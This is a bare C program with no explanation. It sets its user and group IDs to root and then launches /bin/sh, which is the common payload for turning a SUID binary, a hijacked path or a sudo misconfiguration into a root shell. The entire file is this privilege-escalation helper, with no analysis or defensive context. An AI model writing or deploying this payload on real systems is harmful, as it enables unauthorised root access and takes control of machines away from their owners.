#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void main() {
    setuid(0);
    setgid(0);
    execl("/bin/sh", "sh", NULL);
}
